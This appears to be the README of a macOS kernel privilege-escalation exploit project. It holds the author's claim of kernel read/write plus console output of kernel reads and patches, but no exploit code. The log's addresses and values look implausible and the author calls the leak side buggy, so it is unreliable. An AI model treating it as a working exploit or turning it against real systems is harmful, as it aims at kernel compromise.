# panicless_osx
This exploit is working with r/w privilige exc. but needs fix on reading mem/leak side due its abit buggy.

[panicless_osx] lets move in the dangly sketchy exploit
<br />
[panicless_osx] getting kernel task.
<br />
[panicless_osx] writing argument to dlopen.
<br />
[+] done!
<br />
[panicless_osx] exploring fake kernel_task abilities
<br />
[exploit] kernel_task (os/kern) successful
<br />
[+] kernel_task -> 0x1048835
<br />
[+] (read/kern) orig where:0x1056768 -> val 16
<br />
[+] (read/kern) patched where:0x1056768 -> val -272633096
<br />
[+] (read/kern) orig where:0x8192 -> val -272633088
<br />
[+] (read/kern) patched where:0x8192 -> val -272633096
<br />
[+] (read/kern) READ/MEMORY LEAK 
<br />
where 0x4919 ->
<br />
info: nil
<br />
[+] (read/kern) READ/MEMORY LEAK 
<br />
where 0x9015 ->
<br />
info: nil
<br />
[panicless_osx] fun part here (lets have some fun?)
<br />
[+] (read/kern) READ/MEMORY LEAK 
<br />
where 0x16777504 ->
<br />
info: nil
<br />
info -> 8
<br />
[+] (read/kern) READ/MEMORY LEAK 
<br />
where 0x16778272 ->
<br />
info: nil
<br />
info -> 16
<br />
[+] (read/kern) READ/MEMORY LEAK 
<br />
where 0x16777504 ->
<br />
info: nil
<br />
info -> 16
<br />
[+] (read/kern) READ/MEMORY LEAK 
<br />
where 0x13443 ->
<br />
info: nil
<br />
info -> 16
<br />
[+] (read/kern) orig where:0x13443 -> val 16
<br />
[+] (read/kern) patched where:0x13443 -> val -272633096
<br />
[+] (read/kern) READ/MEMORY LEAK 
<br />
where 0x13443 ->
<br />
info: nil
<br />
info -> 16
<br />
[+] (read/kern) READ/MEMORY LEAK 
<br />
where 0x13443 ->
<br />
info: nil
<br />
[*] wefun -> 0x16
<br />
[*] wefun_pac -> 0x16777215
<br />
[+] (read/kern) READ/MEMORY LEAK 
<br />
where 0x16777231 ->
<br />
info: nil
<br />
wefun_pac_orig -> 16
<br />
[+] (read/kern) orig where:0x16777231 -> val 16
<br />
[+] (read/kern) patched where:0x16777231 -> val -272633096
<br />
[+] (read/kern) READ/MEMORY LEAK 
<br />
where 0x16777231 ->
<br />
info: nil
<br />
wefun_pac_patched -> 16
<br />
[panicless_osx] ADD YOUR STUFF HERE
<br />
Program ended with exit code: 0
